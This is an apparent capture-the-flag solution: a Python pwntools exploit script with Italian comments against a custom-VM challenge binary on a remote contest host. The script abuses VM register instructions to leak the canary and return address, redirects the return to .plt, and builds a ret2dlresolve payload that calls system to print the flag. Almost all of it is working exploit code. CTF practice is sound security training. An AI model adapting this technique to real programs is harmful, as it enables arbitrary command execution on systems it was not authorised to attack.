from pwn import *

logging.disable()

r = remote("30elode.challs.olicyber.it", 38301)
elf = ELF("30elode", checksec=False)
context.binary = elf

payload = b""

OPCODE_ADD     = 0x0
OPCODE_SUB     = 0x1
OPCODE_MUL     = 0x2
OPCODE_DIV     = 0x3
OPCODE_AND     = 0x4
OPCODE_OR      = 0x5
OPCODE_XOR     = 0x6
OPCODE_SHL     = 0x7
OPCODE_SHR     = 0x8
OPCODE_PUSH    = 0x9
OPCODE_POP     = 0xa
OPCODE_MOV     = 0xb
OPCODE_PUSHALL    = 0xc
OPCODE_POPALL = 0xd
OPCODE_LOAD     = 0xe

SIZE_8  = 0x0
SIZE_16 = 0x1
SIZE_REG    = 0x2

def build_instr(opcode, d, s):
    return (p8(opcode) + p8(d << 4 | s)).ljust(4, b"\x00")

# ----- OPERAZIONI ----- #
def ADD(d, s): return build_instr(OPCODE_ADD, d, s)
def SUB(d, s): return build_instr(OPCODE_SUB, d, s)
def MUL(d, s): return build_instr(OPCODE_MUL, d, s)
def DIV(d, s): return build_instr(OPCODE_DIV, d, s)
def AND(d, s): return build_instr(OPCODE_AND, d, s)
def OR(d, s):  return build_instr(OPCODE_OR,  d, s)
def XOR(d, s): return build_instr(OPCODE_XOR, d, s)
def SHL(d, s): return build_instr(OPCODE_SHL, d, s)
def SHR(d, s): return build_instr(OPCODE_SHR, d, s)
def MOV(d, s): return build_instr(OPCODE_MOV, d, s)

# ----- GESTIONE STACK ----- #
def PUSH_REG(reg):
    return p8(OPCODE_PUSH) + p8(SIZE_REG) + p16(reg)

def PUSH_BYTE(byte):
    return (p8(OPCODE_PUSH) + p8(SIZE_8) + p8(byte)).ljust(4, b"\x00")
def PUSH_WORD(word):
    return p8(OPCODE_PUSH) + p8(SIZE_16) + p16(word)
def PUSH_DWORD(dword):
    return PUSH_WORD(dword >> 16) + PUSH_WORD(dword & 0xffff)
def PUSH_QWORD(qword):
    return PUSH_DWORD(qword >> 32) + PUSH_DWORD(qword & 0xffffffff)

def POP(reg):
    return (p8(OPCODE_POP) + p8(reg)).ljust(4, b"\x00")

def PUSHALL():
    return p8(OPCODE_PUSHALL).ljust(4, b"\x00")

def POPALL():
    return p8(OPCODE_POPALL).ljust(4, b"\x00")

# ----- GESTIONE REGISTRI ----- #
def LOAD(imm, reg):
    return p8(OPCODE_LOAD) + p16(imm) + p8(reg)


payload += POPALL() # regs[14]=canary || regs[13]=stack leak || regs[12]=ret leak || regs[11]=reloc_index

plt_init_offset = 0x1020 # objdump -d 30elode -j .plt
leak_ret_offset = 0x1cfe # registro 12 dopo POPALL iniziale (return vm())

payload += LOAD(leak_ret_offset - plt_init_offset, 0)
payload += SUB(12, 0) # modifico il return facendolo puntare a .plt

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["whatever"], data_addr=elf.sym["regs"])

payload += LOAD(dlresolve.reloc_index, 11) # indice nella .rel.plt tale che il calcolo del linker punti a regs
payload += PUSHALL()

for i in range(0, len(dlresolve.payload) // 8): # imposto i registri in modo che contengano il payload
    payload += PUSH_QWORD(u64(dlresolve.payload[8*i : 8*(i+1)]))
    payload += POP(i)

payload += b"cat flag >&2" # siccome stdin e stdout sono canali chiusi scrivo su strerr (>&2)
                           # PS: rdi a ogni operazione punta a quel punto dello stack, alla fine punterà qui
if len(payload) % 4 != 0:
    payload = payload.ljust((len(payload) // 4 + 1) * 4, b"\x00")

r.recv(1000)
r.sendline(f"{len(payload)}".encode())
r.recv(1000)
r.sendline(payload)
print(r.recvline().decode().strip())